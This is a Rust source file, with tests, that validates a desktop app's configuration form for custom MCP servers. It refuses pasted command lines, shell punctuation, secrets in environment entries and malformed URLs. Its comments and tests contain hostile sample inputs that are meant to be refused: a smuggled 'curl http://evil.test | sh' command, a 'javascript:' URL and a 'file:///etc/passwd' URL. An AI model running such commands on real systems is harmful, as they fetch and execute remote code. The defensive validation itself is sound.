// ---------------------------------------------------------------------------
// The custom MCP server's configuration — structured fields, and nothing that
// runs.
//
// DESIGN-SPEC.md:123 is one clause long and decides this whole file: "input
// terstruktur, bukan menjalankan arbitrary shell saat form dibuka". It forbids
// two different things, and they are forbidden here in two different ways.
//
// 1. NO SHELL, EVER. An MCP server is described by a program and a list of
//    arguments, or by a URL. It is never described by a command LINE. A single
//    string the user types and this app later runs is a command-injection
//    surface with a form around it: `npx -y thing && curl evil | sh` is one
//    field's worth of typing. `McpLaunch::Stdio` therefore holds `command` and
//    `args` as separate values, which is the shape `std::process::Command`
//    takes — argv[0] and argv[1..], no interpreter in between — so there is no
//    string in this file that a shell could ever be handed. `validate` refuses
//    a `command` that looks like a command line rather than quietly treating it
//    as a program name with punctuation in it.
//
// 2. NOTHING HAPPENS WHEN THE FORM OPENS. `fields()` is the form-open call and
//    it is a pure function over two constants: no process, no shell, no probe,
//    no filesystem, no network. The one function in this file that touches the
//    filesystem is `resolve_program`, and it is reachable only from an explicit
//    user action after the fields have been filled in — see the note on it for
//    why even THAT does not run the program.
//
// WHY REFUSE RATHER THAN REPAIR. Every rule below names the field it rejected
// and changes nothing. browser.rs:174's `normalize_url` draws the line in the
// same place and is worth reading next to this: it will add a missing scheme to
// something a human typed into an address bar, but it REFUSES a URL carrying
// userinfo rather than stripping it, because silently changing where a request
// goes is worse than not going. A stored server address is further along that
// line than an address bar — it is reused on every launch, long after the user
// has stopped looking at it — so nothing here is corrected at all. A missing
// scheme is an error with a sentence attached, not an assumption.
//
// WHY `env` IS NAMES AND NOT PAIRS. The usual MCP config carries
// `env: {"API_KEY": "..."}`, i.e. values. A value typed into this form would be
// persisted in ~/.efficlaude/studio.json, and that is precisely the one thing
// this feature may not do: connections.rs:35-52 makes a secret unrepresentable
// by giving `CredentialRef` nowhere to put one, and an arbitrary string map
// would hand it a place. So `env_passthrough` is a list of variable NAMES to
// forward from the environment the user already has. It is structurally
// incapable of holding a secret, the names are shown in the UI as exactly what
// they are, and a secret that genuinely belongs to this app goes where every
// other one goes: the keychain, named by the connection's `CredentialRef`.
// ---------------------------------------------------------------------------

use serde::{Deserialize, Serialize};

/// How a custom MCP server is started or reached.
///
/// Internally tagged, so the wire form is `{"kind":"stdio",...}` /
/// `{"kind":"remote",...}` — a discriminated union a frontend can switch on,
/// and a shape in which the two cases cannot be half-merged. There is no third
/// variant and in particular no `Shell`: see rule 1 above.
///
/// TWO `rename_all`s, and both are needed. `rename_all` on an ENUM renames its
/// VARIANTS (`Stdio` -> `stdio`) and leaves the fields inside them alone — the
/// trap connections.rs:107-115 records for `ConnectionStatus`, which bites
/// harder here because a struct variant has fields to get wrong. Without the
/// per-variant attribute `env_passthrough` goes onto the wire in snake_case
/// while the frontend reads `envPassthrough`, which is a field that silently
/// arrives empty. `a_server_is_described_by_structured_fields_and_never_by_a_
/// shell_string` asserts the serialised bytes rather than trusting either
/// attribute; it is how this was caught.
#[derive(Serialize, Deserialize, Clone, PartialEq, Eq, Debug)]
#[serde(rename_all = "camelCase", tag = "kind")]
pub enum McpLaunch {
    /// A local program this app would spawn directly. `command` is argv[0] and
    /// `args` is argv[1..]; there is no field between them for an interpreter.
    #[serde(rename_all = "camelCase")]
    Stdio {
        command: String,
        #[serde(default)]
        args: Vec<String>,
        /// Variable NAMES to forward from the user's own environment. Never
        /// values — see the note at the top of this file.
        #[serde(default)]
        env_passthrough: Vec<String>,
    },
    /// A server already running somewhere, reached over a URL.
    #[serde(rename_all = "camelCase")]
    Remote {
        url: String,
        /// The user's own label for the transport, kept as free text for the
        /// reason `ConnectionRecord::transport` records: DESIGN-SPEC.md:121
        /// says not to hardcode transport support that has not been verified,
        /// and nothing in this tree speaks any MCP transport. An enum here
        /// would read as this binary declaring which ones it supports.
        #[serde(default)]
        transport: Option<String>,
    },
}

/// What the form is allowed to ask for, as data.
///
/// A descriptor rather than markup: the backend owns which fields exist and
/// what each one means, so a field cannot appear in the form that no validation
/// rule covers. `secret` is not among them and cannot be — a value has no field
/// to arrive in (connections.rs:273-306).
#[derive(Serialize, Clone, Debug)]
#[serde(rename_all = "camelCase")]
pub struct FieldSpec {
    /// The key in `McpLaunch`, so a refusal naming a field names something the
    /// form can actually highlight.
    pub name: &'static str,
    pub label: &'static str,
    /// `list` is a repeated single-line value; `text` is one.
    pub repeated: bool,
    pub required: bool,
    pub help: &'static str,
}

/// The stdio form's fields.
pub const STDIO_FIELDS: [FieldSpec; 3] = [
    FieldSpec {
        name: "command",
        label: "Program",
        repeated: false,
        required: true,
        help: "The program to run, on its own. Put every argument in Arguments below — this \
               field is not a command line and is never given to a shell.",
    },
    FieldSpec {
        name: "args",
        label: "Arguments",
        repeated: true,
        required: false,
        help: "One argument per row, exactly as the program should receive it. Quoting is not \
               needed and not interpreted: spaces, quotes and $ are passed through unchanged.",
    },
    FieldSpec {
        name: "envPassthrough",
        label: "Environment variables to pass through",
        repeated: true,
        required: false,
        help: "Variable NAMES only, forwarded from your own environment. There is nowhere here \
               to type a value, so a token cannot be saved into this app's config file — store \
               it in the keychain through this connection's credential instead.",
    },
];

/// The remote form's fields.
pub const REMOTE_FIELDS: [FieldSpec; 2] = [
    FieldSpec {
        name: "url",
        label: "Server URL",
        repeated: false,
        required: true,
        help: "The full address including http:// or https://. A missing scheme is refused \
               rather than guessed, because guessing changes where the request goes.",
    },
    FieldSpec {
        name: "transport",
        label: "Transport (label only)",
        repeated: false,
        required: false,
        help: "Shown back to you as you wrote it. This build speaks no MCP transport and so \
               declares none.",
    },
];

/// Both field sets, for the form to render.
///
/// THE FORM-OPEN CALL. Pure: two constants cloned into a struct. It spawns no
/// process, runs no shell, probes no binary, reads no file and touches no
/// network, so opening the form has no side effect of any kind and costs
/// nothing that could hang.
#[derive(Serialize, Clone, Debug)]
#[serde(rename_all = "camelCase")]
pub struct FormSpec {
    pub stdio: Vec<FieldSpec>,
    pub remote: Vec<FieldSpec>,
}

pub fn fields() -> FormSpec {
    FormSpec {
        stdio: STDIO_FIELDS.to_vec(),
        remote: REMOTE_FIELDS.to_vec(),
    }
}

/// Characters that mean something to a shell. None of them is dangerous here —
/// no shell is involved on any path in this crate's MCP handling — but their
/// presence in `command` is near-proof that the user pasted a command LINE into
/// a field that holds a program, and silently spawning a program whose name
/// contains `&&` would fail with an error about a missing file rather than about
/// the real mistake.
const SHELL_METACHARACTERS: [char; 13] = [
    '|', '&', ';', '<', '>', '(', ')', '$', '`', '"', '\'', '\\', '*',
];

/// How many arguments and passthrough names one server may declare. A bound
/// rather than no bound: these are persisted and re-read on every launch, and a
/// form that accepts an unbounded list is a form that can be used to make the
/// config file unreadable.
const MAX_LIST: usize = 64;

/// An upper bound on one field, for the same reason.
const MAX_FIELD: usize = 4096;

fn one_line(field: &str, value: &str) -> Result<(), String> {
    if value.len() > MAX_FIELD {
        return Err(format!(
            "{field}: this is longer than {MAX_FIELD} characters, which is not a value this form \
             can store"
        ));
    }
    if value.chars().any(char::is_control) {
        return Err(format!(
            "{field}: this contains a line break or other control character. Remove it — it is \
             not corrected automatically, because changing what you typed could change what this \
             connects to."
        ));
    }
    Ok(())
}

/// Validates a launch structurally and refuses with a reason that names the
/// field. Nothing is corrected, nothing is normalised, and nothing is run.
///
/// Pure: no filesystem, no process, no network. `configure` in connections.rs
/// calls this, which is what makes an invalid launch unstorable rather than
/// merely undisplayed.
pub fn validate(launch: &McpLaunch) -> Result<(), String> {
    match launch {
        McpLaunch::Stdio {
            command,
            args,
            env_passthrough,
        } => {
            let command = command.trim();
            if command.is_empty() {
                return Err("command: name the program to run".into());
            }
            one_line("command", command)?;
            if command.split_whitespace().count() > 1 {
                return Err(
                    "command: this holds one program, not a command line. Move everything after \
                     the program name into the arguments list — this app runs the program \
                     directly and never through a shell, so a command line here would be looked \
                     up as a single filename."
                        .into(),
                );
            }
            if let Some(bad) = command.chars().find(|c| SHELL_METACHARACTERS.contains(c)) {
                return Err(format!(
                    "command: `{bad}` is shell punctuation, and this field is a program name that \
                     is never given to a shell. If it is part of a genuine filename, give the \
                     program's full path in the arguments list instead."
                ));
            }
            // A bare name is resolved against the login PATH; anything with a
            // separator must say exactly where it is, because a relative path
            // would be resolved against a working directory nobody chose.
            if command.contains('/') && !command.starts_with('/') {
                return Err(
                    "command: a path must be absolute. A relative path would be resolved against \
                     whatever directory this app happens to be in, which is not something you \
                     chose."
                        .into(),
                );
            }

            if args.len() > MAX_LIST {
                return Err(format!("args: more than {MAX_LIST} arguments"));
            }
            for (i, arg) in args.iter().enumerate() {
                // Deliberately NOT rejected: spaces, quotes, `$`, `|`. An
                // argument is handed to the program verbatim as one element of
                // argv, so none of them is special and refusing them would
                // block legitimate values for no gain.
                one_line(&format!("args[{i}]"), arg)?;
            }

            if env_passthrough.len() > MAX_LIST {
                return Err(format!(
                    "envPassthrough: more than {MAX_LIST} variable names"
                ));
            }
            for (i, name) in env_passthrough.iter().enumerate() {
                check_env_name(i, name)?;
                if env_passthrough[..i].iter().any(|other| other == name) {
                    return Err(format!("envPassthrough[{i}]: `{name}` is listed twice"));
                }
            }
            Ok(())
        }
        McpLaunch::Remote { url, transport } => {
            check_url(url)?;
            if let Some(label) = transport {
                one_line("transport", label)?;
            }
            Ok(())
        }
    }
}

/// An environment variable name, and not a value: the grammar here admits
/// nothing with an `=` in it, so a `FOO=bar` pasted into the list is refused
/// rather than forwarded as a variable literally named `FOO=bar`.
fn check_env_name(i: usize, name: &str) -> Result<(), String> {
    if name.is_empty() {
        return Err(format!("envPassthrough[{i}]: empty variable name"));
    }
    if name.contains('=') {
        return Err(format!(
            "envPassthrough[{i}]: this list takes variable NAMES, not assignments. `{}` is the \
             name; its value is read from your own environment and is never stored by this app.",
            name.split('=').next().unwrap_or(name)
        ));
    }
    let mut chars = name.chars();
    let first = chars.next().unwrap_or('0');
    if !(first.is_ascii_alphabetic() || first == '_') {
        return Err(format!(
            "envPassthrough[{i}]: `{name}` is not a variable name — it must start with a letter \
             or an underscore"
        ));
    }
    if !chars.all(|c| c.is_ascii_alphanumeric() || c == '_') {
        return Err(format!(
            "envPassthrough[{i}]: `{name}` is not a variable name — letters, digits and \
             underscores only"
        ));
    }
    Ok(())
}

/// The scheme must be written out. Unlike `browser::normalize_url`, which adds
/// `https://` to something a human typed into an address bar, nothing is added
/// here: this value is stored and reused on every launch, so an assumed scheme
/// is an assumption nobody will ever be shown again.
const ALLOWED_SCHEMES: [&str; 2] = ["https://", "http://"];

fn check_url(url: &str) -> Result<(), String> {
    let trimmed = url.trim();
    if trimmed.is_empty() {
        return Err("url: give the server's address".into());
    }
    one_line("url", trimmed)?;
    if trimmed != url {
        return Err(
            "url: this has a space at the start or end. Remove it — it is not trimmed for you, \
             because an address this app silently edits is an address you have not checked."
                .into(),
        );
    }
    if trimmed.chars().any(char::is_whitespace) {
        return Err("url: a server address cannot contain a space".into());
    }
    let Some(scheme) = ALLOWED_SCHEMES
        .iter()
        .find(|s| trimmed.len() > s.len() && trimmed.starts_with(**s))
    else {
        return Err(
            "url: start the address with https:// or http://. It is not added for you — which \
             scheme is used decides whether the connection is encrypted, and that is not \
             something this app should decide on your behalf."
                .into(),
        );
    };
    let rest = &trimmed[scheme.len()..];
    let authority = rest.split(['/', '?', '#']).next().unwrap_or(rest);
    if authority.is_empty() {
        return Err("url: there is no server name after the scheme".into());
    }
    // The same refusal `normalize_url` makes and for the same reason: userinfo
    // is credentials in a field that is displayed, logged and persisted, and
    // STRIPPING it would silently send the request somewhere else.
    if authority.contains('@') {
        return Err(
            "url: a username or password in the address is refused rather than removed. Take the \
             `user:pass@` out yourself and store the secret as this connection's credential, \
             where it goes to the keychain instead of into this app's config file."
                .into(),
        );
    }
    Ok(())
}

/// Where a `command` would be found, WITHOUT running it.
///
/// Reachable only from an explicit action on a filled-in form — never from
/// `fields()`, which is what the form opens with. Two things it deliberately
/// does not do:
///
///   * it does not execute the program. `doctor::probe_command` is this crate's
///     tool for "does this work", and it answers by RUNNING the thing; that is
///     correct for `codex --version` and completely wrong here, because the
///     program is an arbitrary path the user typed and validating it must not
///     be a reason to run it. The question "where is it" is answerable by
///     looking, so it is answered by looking;
///   * it does not go through a shell. `command -v` and `which` are the usual
///     answers to this question and both mean an interpreter, which rule 1 at
///     the top of this file forbids.
///
/// `warm_login_shell_path()` first, for the reason doctor.rs:291-313 records: a
/// GUI process inherits no shell PATH, and resolving one costs a whole
/// `$SHELL -ilc` (measured there at 450-820 ms). Warming it outside any budget
/// is what keeps that cost off the one call that needs the answer.
pub fn resolve_program(launch: &McpLaunch) -> Result<String, String> {
    validate(launch)?;
    let McpLaunch::Stdio { command, .. } = launch else {
        return Err(
            "this server is reached over a URL, so there is no local program to find".into(),
        );
    };
    let command = command.trim();
    crate::doctor::warm_login_shell_path();

    if command.starts_with('/') {
        return if is_executable_file(std::path::Path::new(command)) {
            Ok(command.to_string())
        } else {
            Err(format!(
                "command: nothing executable at {command}. The path is used exactly as written — \
                 it is not searched for elsewhere."
            ))
        };
    }

    let path = crate::shell_env::login_shell_path();
    for dir in path.split(':').filter(|d| !d.is_empty()) {
        let candidate = std::path::Path::new(dir).join(command);
        if is_executable_file(&candidate) {
            return Ok(candidate.to_string_lossy().into_owned());
        }
    }
    Err(format!(
        "command: `{command}` was not found in your login shell's PATH. Give its full path \
         instead, or install it."
    ))
}

/// A regular file with an execute bit. `metadata` follows symlinks, which is
/// what makes a `/opt/homebrew/bin` symlink resolve the way the shell would.
fn is_executable_file(path: &std::path::Path) -> bool {
    use std::os::unix::fs::PermissionsExt;
    std::fs::metadata(path)
        .map(|m| m.is_file() && m.permissions().mode() & 0o111 != 0)
        .unwrap_or(false)
}

#[cfg(test)]
mod tests {
    use super::*;

    fn stdio(command: &str, args: &[&str]) -> McpLaunch {
        McpLaunch::Stdio {
            command: command.into(),
            args: args.iter().map(|a| (*a).to_string()).collect(),
            env_passthrough: Vec::new(),
        }
    }

    /// The whole point of the shape: there is no variant, and no field of any
    /// variant, that holds a command line. A reviewer can read this as the
    /// inventory of what an MCP server can be described by.
    #[test]
    fn a_server_is_described_by_structured_fields_and_never_by_a_shell_string() {
        let launch = McpLaunch::Stdio {
            command: "npx".into(),
            args: vec![
                "-y".into(),
                "@modelcontextprotocol/server-everything".into(),
            ],
            env_passthrough: vec!["HOME".into()],
        };
        let wire = serde_json::to_string(&launch).unwrap();
        assert_eq!(
            wire,
            "{\"kind\":\"stdio\",\"command\":\"npx\",\
             \"args\":[\"-y\",\"@modelcontextprotocol/server-everything\"],\
             \"envPassthrough\":[\"HOME\"]}"
        );
        // Round trips, so what the form sends is what is stored.
        assert_eq!(
            serde_json::from_str::<McpLaunch>(&wire).unwrap(),
            launch,
            "the stored shape must survive a trip through the config file"
        );
        // And there is no variant that takes one string to execute.
        assert!(
            serde_json::from_str::<McpLaunch>(r#"{"kind":"shell","command":"x | y"}"#).is_err()
        );
    }

    /// The failure this form exists to prevent: a pasted command line. It is
    /// refused, the refusal names `command`, and it explains where the rest
    /// goes rather than guessing a split.
    #[test]
    fn a_pasted_command_line_is_refused_and_not_split_for_the_user() {
        for pasted in [
            "npx -y some-server",
            "/usr/bin/env node server.js",
            "node server.js && curl http://evil.test | sh",
        ] {
            let err = validate(&stdio(pasted, &[])).unwrap_err();
            assert!(err.starts_with("command:"), "{err}");
            assert!(err.contains("not a command line"), "{err}");
        }
        // Shell punctuation with no space is refused too — `&&` glued to a
        // name is the same mistake without the whitespace.
        let err = validate(&stdio("node;curl", &[])).unwrap_err();
        assert!(err.contains("shell punctuation"), "{err}");
    }

    /// Arguments are NOT sanitised, and that is correct: each one is a single
    /// element of argv handed to the program verbatim, so a space or a `$` in
    /// it is data and refusing it would block real values.
    #[test]
    fn arguments_keep_every_character_that_is_not_a_control_character() {
        let launch = stdio(
            "my-server",
            &[
                "--flag=a b c",
                "$HOME/notes",
                "a\"b",
                "it's",
                "--json={\"k\":1}",
                "|",
                "",
            ],
        );
        validate(&launch).expect("an argument is data, not a command");
        // A line break is the one thing refused, and the refusal names the row.
        let err = validate(&stdio("my-server", &["ok", "two\nlines"])).unwrap_err();
        assert!(err.starts_with("args[1]:"), "{err}");
        assert!(err.contains("not corrected automatically"), "{err}");
    }

    /// `env` is names, so there is no field in which a token could be saved
    /// into studio.json. An assignment is refused with the reason stated.
    #[test]
    fn the_environment_list_takes_names_and_has_nowhere_to_put_a_value() {
        let ok = McpLaunch::Stdio {
            command: "my-server".into(),
            args: vec![],
            env_passthrough: vec!["HOME".into(), "_PRIVATE".into(), "API_BASE2".into()],
        };
        validate(&ok).unwrap();
        // Serialising the whole launch cannot produce a value, because there
        // is no key for one.
        let wire = serde_json::to_string(&ok).unwrap();
        assert!(!wire.contains('='), "{wire}");

        let with_value = McpLaunch::Stdio {
            command: "my-server".into(),
            args: vec![],
            env_passthrough: vec!["API_KEY=placeholder-not-a-real-token".into()],
        };
        let err = validate(&with_value).unwrap_err();
        assert!(err.starts_with("envPassthrough[0]:"), "{err}");
        assert!(err.contains("not assignments"), "{err}");
        assert!(
            !err.contains("placeholder-not-a-real-token"),
            "a refusal must not quote the value back: {err}"
        );

        for bad in ["2FOO", "a-b", "has space", ""] {
            assert!(
                validate(&McpLaunch::Stdio {
                    command: "my-server".into(),
                    args: vec![],
                    env_passthrough: vec![bad.into()],
                })
                .is_err(),
                "{bad} is not a variable name"
            );
        }
        // And the same name twice is a mistake worth naming.
        let dup = validate(&McpLaunch::Stdio {
            command: "my-server".into(),
            args: vec![],
            env_passthrough: vec!["HOME".into(), "HOME".into()],
        })
        .unwrap_err();
        assert!(dup.contains("listed twice"), "{dup}");
    }

    /// A URL is checked and never repaired. The scheme is required, userinfo is
    /// refused rather than stripped — the line browser.rs:174 draws, moved one
    /// step stricter because this value is stored rather than typed each time.
    #[test]
    fn a_url_is_refused_rather_than_corrected() {
        let remote = |url: &str| McpLaunch::Remote {
            url: url.into(),
            transport: None,
        };
        validate(&remote("https://mcp.acme.test/sse")).unwrap();
        validate(&remote("http://127.0.0.1:8080/mcp")).unwrap();

        // No scheme: refused, NOT given one.
        let err = validate(&remote("mcp.acme.test")).unwrap_err();
        assert!(err.starts_with("url:"), "{err}");
        assert!(err.contains("not added for you"), "{err}");

        // Userinfo: refused, NOT stripped. This is the case the comment at the
        // top of this file is about.
        let err = validate(&remote("https://user:placeholder@mcp.acme.test")).unwrap_err();
        assert!(err.contains("refused rather than removed"), "{err}");

        // Whitespace is refused rather than trimmed, so the stored address is
        // always exactly what was approved.
        assert!(validate(&remote(" https://mcp.acme.test")).is_err());
        assert!(validate(&remote("https://mcp.acme.test/a b")).is_err());

        for hostile in [
            "javascript:alert(1)",
            "file:///etc/passwd",
            "data:text/html,<p>x",
            "https://",
            "https:///path",
        ] {
            assert!(
                validate(&remote(hostile)).is_err(),
                "{hostile} must not be accepted"
            );
        }
    }

    /// Every refusal names a field the form can highlight, which is the
    /// difference between "invalid" and a message someone can act on.
    #[test]
    fn every_refusal_names_the_field_it_refused() {
        let cases: Vec<McpLaunch> = vec![
            stdio("", &[]),
            stdio("npx -y x", &[]),
            stdio("./rel/path", &[]),
            stdio("ok", &["bad\nvalue"]),
            McpLaunch::Stdio {
                command: "ok".into(),
                args: vec![],
                env_passthrough: vec!["2bad".into()],
            },
            McpLaunch::Remote {
                url: "nope".into(),
                transport: None,
            },
        ];
        let named = ["command:", "args[", "envPassthrough[", "url:"];
        for case in cases {
            let err = validate(&case).unwrap_err();
            assert!(
                named.iter().any(|n| err.contains(n)),
                "a refusal must name its field: {err}"
            );
        }
    }

    /// A relative path is refused because the directory it would resolve
    /// against is not one the user chose.
    #[test]
    fn a_relative_program_path_is_refused_and_an_absolute_one_is_kept() {
        assert!(validate(&stdio("./server", &[])).is_err());
        assert!(validate(&stdio("bin/server", &[])).is_err());
        validate(&stdio("/usr/local/bin/server", &[])).unwrap();
        validate(&stdio("my-server", &[])).unwrap();
    }

    /// The form-open call. Pure data, and the assertion that matters is the one
    /// a test can actually make about it: there is no field named for a secret,
    /// so the form has nowhere to collect one.
    #[test]
    fn opening_the_form_is_a_pure_read_of_two_constants() {
        let spec = fields();
        assert_eq!(spec.stdio.len(), 3);
        assert_eq!(spec.remote.len(), 2);
        let names: Vec<&str> = spec
            .stdio
            .iter()
            .chain(spec.remote.iter())
            .map(|f| f.name)
            .collect();
        assert_eq!(
            names,
            ["command", "args", "envPassthrough", "url", "transport"]
        );
        for field in spec.stdio.iter().chain(spec.remote.iter()) {
            for forbidden in ["secret", "token", "password"] {
                assert!(
                    !field.name.to_ascii_lowercase().contains(forbidden),
                    "the form has no field for a secret value: {}",
                    field.name
                );
            }
        }
        // Calling it twice is the same answer, which is what "no side effect"
        // looks like from a test's point of view.
        assert_eq!(
            serde_json::to_string(&fields()).unwrap(),
            serde_json::to_string(&spec).unwrap()
        );
    }

    /// Bounds, so a form submission cannot be used to make the config file
    /// unreadable.
    #[test]
    fn the_lists_and_the_fields_are_bounded() {
        let many: Vec<String> = (0..MAX_LIST + 1).map(|i| format!("a{i}")).collect();
        assert!(
            validate(&McpLaunch::Stdio {
                command: "ok".into(),
                args: many.clone(),
                env_passthrough: vec![],
            })
            .is_err()
        );
        assert!(
            validate(&McpLaunch::Stdio {
                command: "ok".into(),
                args: vec![],
                env_passthrough: many,
            })
            .is_err()
        );
        assert!(validate(&stdio("ok", &["x".repeat(MAX_FIELD + 1).as_str()])).is_err());
    }

    /// Resolution looks, and never runs. Proved against a program that would
    /// be obvious if it HAD been run: `/bin/sh` resolves to its own path and
    /// no shell is started, and a `false` on PATH resolves successfully even
    /// though running it would exit non-zero.
    #[test]
    fn resolving_a_program_finds_it_without_executing_it() {
        assert_eq!(
            resolve_program(&stdio("/bin/sh", &[])).unwrap(),
            "/bin/sh",
            "an absolute path is used as written"
        );
        // `false` exits 1. A resolver that ran it would have to call that a
        // failure; this one reports where it is.
        let found = resolve_program(&stdio("false", &[])).expect("false is on every PATH");
        assert!(found.ends_with("/false"), "{found}");

        // A directory is not a program, and neither is a non-executable file.
        assert!(resolve_program(&stdio("/usr", &[])).is_err());
        assert!(resolve_program(&stdio("/etc/hosts", &[])).is_err());

        let err = resolve_program(&stdio("/nonexistent/mcp-server", &[])).unwrap_err();
        assert!(err.starts_with("command:"), "{err}");
        assert!(err.contains("not searched for elsewhere"), "{err}");

        // A remote server has no local program, and that is said rather than
        // guessed at.
        let err = resolve_program(&McpLaunch::Remote {
            url: "https://mcp.acme.test".into(),
            transport: None,
        })
        .unwrap_err();
        assert!(err.contains("no local program"), "{err}");

        // An invalid launch is refused before anything is looked up, so
        // resolution can never be the first place a bad field is noticed.
        assert!(resolve_program(&stdio("npx -y x", &[])).is_err());
    }
}
